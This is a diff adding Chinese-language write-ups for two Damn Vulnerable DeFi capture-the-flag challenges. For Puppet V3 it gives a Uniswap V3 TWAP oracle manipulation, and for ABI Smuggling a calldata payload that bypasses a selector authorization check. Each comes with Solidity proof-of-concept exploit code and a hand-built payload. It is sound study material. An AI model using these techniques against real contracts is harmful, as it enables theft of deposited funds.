@@ -898,3 +898,199 @@ address = keccak256(address(deployer), nonce);
 // CREATE2
 address = keccak256(0xFF, sender, salt, bytecode);
 ```
+
+### Puppet V3
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 無論是熊市還是牛市，真正的 DeFi 開發者都會持續建設。還記得你之前幫助過的那個借貸池嗎？他們現在推出了新版本。他們現在使用 Uniswap V3 作為預言機。沒錯，不再使用現貨價格！這次借貸池查詢的是資產的時間加權平均價格，並且使用了所有推薦的庫。Uniswap 市場中有 100 WETH 和 100 DVT 的流動性。借貸池裡有一百萬個 DVT 代幣。你從 1 ETH 和一些 DVT 開始，必須拯救所有人於這個存在漏洞的借貸池。別忘了將它們發送到指定的恢復帳戶。注意：此挑戰需要有效的 RPC URL，以便將主網狀態分叉到你的本地環境。
+
+過關條件:
+- 必須在 block.timestamp - initialBlockTimestamp < 115 秒內完成
+- 借貸池（lendingPool）中的代幣餘額必須為零
+- 所有LENDING_POOL_INITIAL_TOKEN_BALANCE代幣都被轉移到 recovery 錢包
+
+解題:
+- 要注意 calculateDepositOfWETHRequired 拿到的報價會是3倍價格.
+
+```
+    function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
+        uint256 quote = _getOracleQuote(_toUint128(amount));
+        return quote * DEPOSIT_FACTOR;
+    }
+```
+- Pool 裡有 100 個 WETH 和 100 個 DVT 代幣，流動性較小,PuppetV3Pool.sol合約使用了10分鐘的TWAP期來計算DVT代幣的價格, 這個設定使合約容易受到價格操控攻擊的影響
+, 無需付出太多成本! 有了這個方法後, 我們可以透過我們擁有的 110 DVT 代幣換成 WETH, 使 DVT 代幣變得超級便宜. 因為oracle會根據過去10分鐘的價格數據來計算當前價格。然而，由於TWAP期較短，只需在這10分鐘內大幅度操作交易（如大筆兌換DVT），即可顯著影響報價. 由於TWAP是一種延遲報價機制，在操控價格後，有一個短暫的時間窗口（例如110秒）讓攻擊者利用降低的價格進行不公平的借貸。這個時間窗口允許攻擊者在TWAP價格尚未恢復到正常水平之前，最大化利用這個價格差距來實現獲利.
+
+[POC](./damn-vulnerable-defi/test/puppet-v3/PuppetV3.t.sol) :
+
+```
+    function test_puppetV3() public checkSolvedByPlayer {
+       address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(address(uniswapRouterAddress), type(uint256).max);
+uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+console.log("beofre quote: ", quote1); //quote:3000000000000000000000000
+
+ 
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
+                0,
+                0
+            )
+        );  
+         vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), quote);
+        console.log("quote: ", quote);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
+```
+
+### ABI Smuggling
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 這裡有一個權限金庫，裡面存有 100 萬個 DVT 代幣。該金庫允許定期提取資金，也允許在緊急情況下提取所有資金。合約內嵌了一個通用授權方案，只允許已知帳戶執行特定操作。開發團隊已收到負責任的披露，稱所有資金可能被盜取。請從金庫中救出所有資金，並將其轉移到指定的回收帳戶。
+
+過關條件:
+- Vault 餘額為0
+- 所有VAULT_TOKEN_BALANCE代幣都被轉移到 recovery 錢包
+
+知識點:
+- EVM Calldata 組成
+
+解題:
+- 在 AuthorizedExecutor.execute() 使用 calldataload 從傳入的 actionData 從calldataOffset位置（100 bytes）開始提取 4 個字節的函數選擇器然後使用 getActionId 查這個 ID 是否被授權.
+- deployer 可以執行- sweepFunds 0x85fb709d
+player 可以執行- withdraw 0xd9caed12
+- 關鍵在下方只要繞過 getActionId檢查, 就可以任意執行 functionCall 了
+```
+        if (!permissions[getActionId(selector, msg.sender, target)]) {
+            revert NotAllowed();
+        }
+
+ 
+        return target.functionCall(actionData);
+```
+- 準備 payload. 在 execute() 函數的 ABI 編碼中，actionData 是一個動態大小的 bytes 參數。
+0x80 是一個偏移量，它指向 actionData 實際數據開始的位置。這個偏移量是相對於整個 calldata 的起始位置來計算的。所以在這邊是0x80
+
+```
+// execute selector
+0x1cff79cd
+// vault.address （第一個 32 字節）
+0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
+// offset -> 這個偏移量指向 actionData 在 calldata 中的起始位置。0x80 是 128 字節 （第二個 32 字節）
+0000000000000000000000000000000000000000000000000000000000000080
+// 這個部分沒有實際用途，通常用來填充固定長度的位置 （第三個 32 字節）
+0000000000000000000000000000000000000000000000000000000000000000
+// withdraw() 繞過檢查 （第四個 32 字節）
+**d9caed12**00000000000000000000000000000000000000000000000000000000
+// 這表示 actionData 的總長度是 68 字節（0x44 為十六進制的 68） actionData ( 4 + 32 + 32)
+0000000000000000000000000000000000000000000000000000000000000044
+// sweepFunds calldata
+85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
+```
+
+[POC](./damn-vulnerable-defi/test/abi-smuggling/ABISmuggling.t.sol) :
+```
+    function test_abiSmuggling() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit(address(vault),address(token),recovery);
+        bytes memory payload = exploit.executeExploit();
+        address(vault).call(payload);
+    }
+
+contract Exploit {
+    SelfAuthorizedVault public vault;
+    IERC20 public token;
+    address public player;
+    address public recovery;
+
+    // Event declarations for logging
+    event LogExecuteSelector(bytes executeSelector);
+    event LogTargetAddress(bytes target);
+    event LogDataOffset(bytes dataOffset);
+    event LogEmptyData(bytes emptyData);
+    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
+    event LogActionDataLength(uint actionDataLength);
+    event LogSweepFundsCalldata(bytes sweepFundsCalldata);
+    event LogCalldataPayload(bytes calldataPayload);
+
+    constructor(address _vault, address _token, address _recovery) {
+        vault = SelfAuthorizedVault(_vault);
+        token = IERC20(_token);
+        recovery = _recovery;
+        player = msg.sender;
+    }
+
+    function executeExploit() external returns (bytes memory) {
+        require(msg.sender == player, "Only player can execute exploit");
+
+        // `execute()` function selector
+        bytes4 executeSelector = vault.execute.selector;
+
+        // Construct the target contract address, which is the vault address, padded to 32 bytes
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+
+        // Construct the calldata start location offset
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data
+
+        // Construct the empty data filler (32 bytes of zeros)
+        bytes memory emptyData = abi.encodePacked(uint256(0));
+
+        // Manually define the `withdraw()` function selector as `d9caed12` followed by zeros
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),     // Withdraw function selector
+            bytes28(0)              // 28 zero bytes to fill the 32-byte slot
+        );
+
+        // Construct the calldata for the `sweepFunds()` function
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+
+        // Manually set actionDataLength to 0x44 (68 bytes)
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        emit LogActionDataLength(actionDataLengthValue);
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+
+        // Combine all parts to create the complete calldata payload
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,              // 4 bytes
+            target,                       // 32 bytes
+            dataOffset,                   // 32 bytes
+            emptyData,                    // 32 bytes
+            withdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
+            actionDataLength,             // Length of actionData
+            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
+        );
+
+        // Emit the calldata payload for debugging
+        emit LogCalldataPayload(calldataPayload);
+
+        // Return the constructed calldata payload
+        return calldataPayload;
+    }
+}
+```
+
+```
+REF
+ABI encoding of dynamic types (bytes, strings)
+In the ABI Standard, dynamic types are encoded the following way:
+
+The offset of the dynamic data
+The length of the dynamic data
+The actual value of the dynamic data.
+Memory loc      Data
+0x00            0000000000000000000000000000000000000000000000000000000000000020 // The offset of the data (32 in decimal)
+0x20            000000000000000000000000000000000000000000000000000000000000000d // The length of the data in bytes (13 in decimal)
+0x40            48656c6c6f2c20776f726c642100000000000000000000000000000000000000 // actual value
+If you hex decode 48656c6c6f2c20776f726c6421 you will get "Hello, world!".
+```
